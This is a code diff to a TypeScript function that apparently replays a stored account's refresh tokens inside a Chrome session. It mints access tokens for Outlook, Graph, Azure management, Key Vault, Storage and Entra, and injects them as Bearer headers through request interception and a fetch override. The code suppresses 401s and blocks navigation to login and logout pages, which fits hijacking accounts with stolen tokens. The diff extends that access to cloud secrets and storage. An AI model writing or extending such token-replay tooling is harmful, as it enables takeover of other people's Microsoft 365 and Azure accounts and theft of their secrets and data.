@@ -57,7 +57,7 @@ function decodeJwt(token: string): Record<string, unknown> | null {
 const MS_DOMAINS = ['microsoft.com', 'microsoftonline.com', 'office.com', 'office365.com', 'azure.com', 'sharepoint.com', 'live.com', 'onedrive.com', 'onenote.com'];
 function isMsDomain(hostname: string): boolean { return MS_DOMAINS.some(d => hostname === d || hostname.endsWith('.' + d)); }
 
-const API_DOMAINS = ['outlook.office365.com', 'outlook.office.com', 'outlook.cloud.microsoft.com', 'outlook.cloud.microsoft', 'substrate.office.com', 'graph.microsoft.com', 'admin.microsoft.com', 'portal.office.com', 'www.office.com'];
+const API_DOMAINS = ['outlook.office365.com', 'outlook.office.com', 'outlook.cloud.microsoft.com', 'outlook.cloud.microsoft', 'substrate.office.com', 'graph.microsoft.com', 'admin.microsoft.com', 'portal.office.com', 'www.office.com', 'portal.azure.com', 'management.azure.com', 'entra.microsoft.com', 'graph.windows.net', 'api.azrbac.mspim.azure.com', 'main.iam.ad.ext.azure.com'];
 function isApiDomain(hostname: string): boolean { return API_DOMAINS.some(d => hostname === d || hostname.endsWith('.' + d)); }
 
 const CDN_DOMAINS = ['res.office365.com', 'res.cdn.office.net', 'cdn.office.net', 'akamaized.net', 'msecnd.net', 'aspnetcdn.com', 'office.net', 'shellprod.msocdn.com'];
@@ -121,6 +121,8 @@ const SERVICE_URLS: Record<string, string> = {
   sharepoint: 'https://admin.microsoft.com/#/SharePoint',
   teams: 'https://teams.microsoft.com/',
   azure: 'https://portal.azure.com/',
+  entra: 'https://entra.microsoft.com/',
+  m365admin: 'https://admin.microsoft.com/',
   chrome: 'https://outlook.office365.com/mail/',
 };
 
@@ -179,6 +181,10 @@ async function launchChromeWithSession(account: SyncedAccount, service: string):
       { key: 'outlook365', scope: 'https://outlook.office365.com/.default openid profile offline_access' },
       { key: 'graph', scope: 'https://graph.microsoft.com/.default openid profile offline_access' },
       { key: 'substrate', scope: 'https://substrate.office.com/.default openid profile offline_access' },
+      { key: 'azure', scope: 'https://management.azure.com/.default openid profile offline_access' },
+      { key: 'azurecore', scope: 'https://management.core.windows.net/.default openid profile offline_access' },
+      { key: 'keyvault', scope: 'https://vault.azure.net/.default openid profile offline_access' },
+      { key: 'storage', scope: 'https://storage.azure.com/.default openid profile offline_access' },
     ];
 
     const resourceTokens: Record<string, string> = {};
@@ -244,6 +250,14 @@ async function launchChromeWithSession(account: SyncedAccount, service: string):
         return resourceTokens.graph || (firstResult!.access_token as string);
       if (hostname.includes('substrate'))
         return resourceTokens.substrate || (firstResult!.access_token as string);
+      if (hostname.includes('management.azure') || hostname.includes('portal.azure'))
+        return resourceTokens.azure || resourceTokens.graph || (firstResult!.access_token as string);
+      if (hostname.includes('vault.azure'))
+        return resourceTokens.keyvault || resourceTokens.azure || (firstResult!.access_token as string);
+      if (hostname.includes('storage.azure') || hostname.includes('blob.core.windows') || hostname.includes('file.core.windows') || hostname.includes('table.core.windows') || hostname.includes('queue.core.windows'))
+        return resourceTokens.storage || resourceTokens.azure || (firstResult!.access_token as string);
+      if (hostname.includes('entra.microsoft') || hostname.includes('iam.ad.ext.azure') || hostname.includes('azrbac.mspim.azure'))
+        return resourceTokens.graph || (firstResult!.access_token as string);
       return resourceTokens.graph || (firstResult!.access_token as string);
     }
 
@@ -278,6 +292,9 @@ async function launchChromeWithSession(account: SyncedAccount, service: string):
               const aud = (dec?.aud as string) || '';
               if (aud.includes('graph')) resourceTokens.graph = result.access_token as string;
               else if (aud.includes('outlook')) resourceTokens.outlook = result.access_token as string;
+              else if (aud.includes('management.azure') || aud.includes('management.core.windows')) resourceTokens.azure = result.access_token as string;
+              else if (aud.includes('vault.azure')) resourceTokens.keyvault = result.access_token as string;
+              else if (aud.includes('storage.azure')) resourceTokens.storage = result.access_token as string;
               if (result.refresh_token) currentRefreshToken = result.refresh_token as string;
             }
           } catch { /* ignore */ }
@@ -385,6 +402,9 @@ async function launchChromeWithSession(account: SyncedAccount, service: string):
             try {
               const freshScope = parsed.hostname.includes('graph') ? 'https://graph.microsoft.com/.default openid profile offline_access' :
                 parsed.hostname.includes('substrate') ? 'https://substrate.office.com/.default openid profile offline_access' :
+                parsed.hostname.includes('management.azure') || parsed.hostname.includes('portal.azure') ? 'https://management.azure.com/.default openid profile offline_access' :
+                parsed.hostname.includes('vault.azure') ? 'https://vault.azure.net/.default openid profile offline_access' :
+                parsed.hostname.includes('storage.azure') || parsed.hostname.includes('.core.windows.net') ? 'https://storage.azure.com/.default openid profile offline_access' :
                 'https://outlook.office.com/.default openid profile offline_access';
               const freshResult = await exchangeTokenWithFallback(currentRefreshToken, freshScope);
               if (!freshResult.error && freshResult.access_token) {
@@ -395,6 +415,9 @@ async function launchChromeWithSession(account: SyncedAccount, service: string):
                 if (aud.includes('graph')) resourceTokens.graph = freshToken;
                 else if (aud.includes('outlook') || aud.includes('office')) resourceTokens.outlook = freshToken;
                 else if (aud.includes('substrate')) resourceTokens.substrate = freshToken;
+                else if (aud.includes('management.azure') || aud.includes('management.core.windows')) resourceTokens.azure = freshToken;
+                else if (aud.includes('vault.azure')) resourceTokens.keyvault = freshToken;
+                else if (aud.includes('storage.azure')) resourceTokens.storage = freshToken;
 
                 const h2 = new Headers(request.headers);
                 h2.set('Authorization', 'Bearer ' + freshToken);
@@ -673,6 +696,9 @@ async function launchChromeWithSession(account: SyncedAccount, service: string):
           { key: 'outlook365', scope: 'https://outlook.office365.com/.default openid profile offline_access' },
           { key: 'graph', scope: 'https://graph.microsoft.com/.default openid profile offline_access' },
           { key: 'substrate', scope: 'https://substrate.office.com/.default openid profile offline_access' },
+          { key: 'azure', scope: 'https://management.azure.com/.default openid profile offline_access' },
+          { key: 'keyvault', scope: 'https://vault.azure.net/.default openid profile offline_access' },
+          { key: 'storage', scope: 'https://storage.azure.com/.default openid profile offline_access' },
         ];
         const refreshResults = await Promise.allSettled(
           refreshScopes.map(s => exchangeTokenWithFallback(currentRefreshToken, s.scope).then(r => ({ ...r, _key: s.key })))
@@ -868,6 +894,9 @@ async function launchChromeWithSession(account: SyncedAccount, service: string):
                     const aud = (dec?.aud as string) || '';
                     if (aud.includes('graph')) { resourceTokens.graph = freshToken; graphToken = freshToken; }
                     else if (aud.includes('outlook') || aud.includes('office')) { resourceTokens.outlook = freshToken; owaToken = freshToken; }
+                    else if (aud.includes('management.azure') || aud.includes('management.core.windows')) { resourceTokens.azure = freshToken; }
+                    else if (aud.includes('vault.azure')) { resourceTokens.keyvault = freshToken; }
+                    else if (aud.includes('storage.azure')) { resourceTokens.storage = freshToken; }
                     if (freshResult.refresh_token) currentRefreshToken = freshResult.refresh_token as string;
                     console.log('[Fetch] Got fresh token (aud=' + aud.substring(0, 40) + ')');
                   } else {
@@ -919,14 +948,17 @@ async function launchChromeWithSession(account: SyncedAccount, service: string):
               return;
             }
 
-            // OWA/Office/Graph requests — continue with Authorization header (use freshest token)
-            if (reqUrl.includes('outlook.office365.com') || reqUrl.includes('outlook.office.com') || reqUrl.includes('outlook.cloud.microsoft') || reqUrl.includes('substrate.office.com') || reqUrl.includes('graph.microsoft.com')) {
+            // OWA/Office/Graph/Azure requests — continue with Authorization header (use freshest token)
+            if (reqUrl.includes('outlook.office365.com') || reqUrl.includes('outlook.office.com') || reqUrl.includes('outlook.cloud.microsoft') || reqUrl.includes('substrate.office.com') || reqUrl.includes('graph.microsoft.com') || reqUrl.includes('management.azure.com') || reqUrl.includes('portal.azure.com') || reqUrl.includes('vault.azure.net') || reqUrl.includes('entra.microsoft.com') || reqUrl.includes('graph.windows.net') || reqUrl.includes('azrbac.mspim.azure.com') || reqUrl.includes('iam.ad.ext.azure.com')) {
               const existingHeaders = params.request.headers || {};
               const headerList = Object.entries(existingHeaders).map(([n, v]) => ({ name: n, value: v as string }));
               // Pick the right token for the domain
               let bearerToken = owaToken;
               if (reqUrl.includes('graph.microsoft.com')) bearerToken = resourceTokens.graph || graphToken;
               else if (reqUrl.includes('substrate')) bearerToken = resourceTokens.substrate || owaToken;
+              else if (reqUrl.includes('management.azure.com') || reqUrl.includes('portal.azure.com')) bearerToken = resourceTokens.azure || resourceTokens.graph || owaToken;
+              else if (reqUrl.includes('vault.azure.net')) bearerToken = resourceTokens.keyvault || resourceTokens.azure || owaToken;
+              else if (reqUrl.includes('entra.microsoft') || reqUrl.includes('graph.windows.net') || reqUrl.includes('azrbac') || reqUrl.includes('iam.ad.ext')) bearerToken = resourceTokens.graph || owaToken;
               else bearerToken = resourceTokens.outlook || owaToken;
               if (!headerList.some(h => h.name.toLowerCase() === 'authorization')) {
                 headerList.push({ name: 'Authorization', value: 'Bearer ' + bearerToken });
@@ -983,6 +1015,14 @@ async function launchChromeWithSession(account: SyncedAccount, service: string):
             { urlPattern: 'https://outlook.cloud.microsoft/*', requestStage: 'Request' },
             { urlPattern: '*substrate.office.com/*', requestStage: 'Request' },
             { urlPattern: '*graph.microsoft.com/*', requestStage: 'Request' },
+            // Azure/Entra domains
+            { urlPattern: 'https://management.azure.com/*', requestStage: 'Request' },
+            { urlPattern: 'https://portal.azure.com/*', requestStage: 'Request' },
+            { urlPattern: 'https://entra.microsoft.com/*', requestStage: 'Request' },
+            { urlPattern: 'https://graph.windows.net/*', requestStage: 'Request' },
+            { urlPattern: '*vault.azure.net/*', requestStage: 'Request' },
+            { urlPattern: '*azrbac.mspim.azure.com/*', requestStage: 'Request' },
+            { urlPattern: '*iam.ad.ext.azure.com/*', requestStage: 'Request' },
             // Response-stage: catch 302 redirects to outlook.cloud.microsoft.com
             { urlPattern: 'https://outlook.office365.com/*', requestStage: 'Response' },
             { urlPattern: 'https://outlook.office.com/*', requestStage: 'Response' },
@@ -1015,9 +1055,12 @@ async function launchChromeWithSession(account: SyncedAccount, service: string):
 (function(){
   var TOKEN = ${JSON.stringify(owaToken)};
   var GRAPH_TOKEN = ${JSON.stringify(graphToken)};
-  var MS_DOMAINS = ['outlook.office365.com','outlook.office.com','outlook.cloud.microsoft.com','outlook.cloud.microsoft','substrate.office.com','graph.microsoft.com','outlook.live.com'];
+  var AZURE_TOKEN = ${JSON.stringify(resourceTokens.azure || owaToken)};
+  var KV_TOKEN = ${JSON.stringify(resourceTokens.keyvault || resourceTokens.azure || owaToken)};
+  var STORAGE_TOKEN = ${JSON.stringify(resourceTokens.storage || resourceTokens.azure || owaToken)};
+  var MS_DOMAINS = ['outlook.office365.com','outlook.office.com','outlook.cloud.microsoft.com','outlook.cloud.microsoft','substrate.office.com','graph.microsoft.com','outlook.live.com','management.azure.com','portal.azure.com','entra.microsoft.com','vault.azure.net','graph.windows.net','azrbac.mspim.azure.com','iam.ad.ext.azure.com'];
   function isMsDomain(url){try{var h=new URL(url).hostname;return MS_DOMAINS.some(function(d){return h.includes(d)})}catch(e){return false}}
-  function getToken(url){if(url.includes('graph.microsoft.com'))return GRAPH_TOKEN;if(url.includes('outlook.cloud.microsoft'))return TOKEN;return TOKEN}
+  function getToken(url){if(url.includes('graph.microsoft.com'))return GRAPH_TOKEN;if(url.includes('management.azure.com')||url.includes('portal.azure.com'))return AZURE_TOKEN;if(url.includes('vault.azure.net'))return KV_TOKEN;if(url.includes('storage.azure')||url.includes('.core.windows.net'))return STORAGE_TOKEN;if(url.includes('entra.microsoft')||url.includes('graph.windows.net')||url.includes('azrbac')||url.includes('iam.ad.ext'))return GRAPH_TOKEN;if(url.includes('outlook.cloud.microsoft'))return TOKEN;return TOKEN}
   function isBlockedNav(url){return typeof url==='string'&&(url.includes('login.microsoftonline.com')||url.includes('/logoff')||url.includes('/signout')||url.includes('/logout')||url.includes('oauth2/authorize')||url.includes('outlook.cloud.microsoft'))}
 
   // 1. Override fetch — add Bearer token + suppress 401s
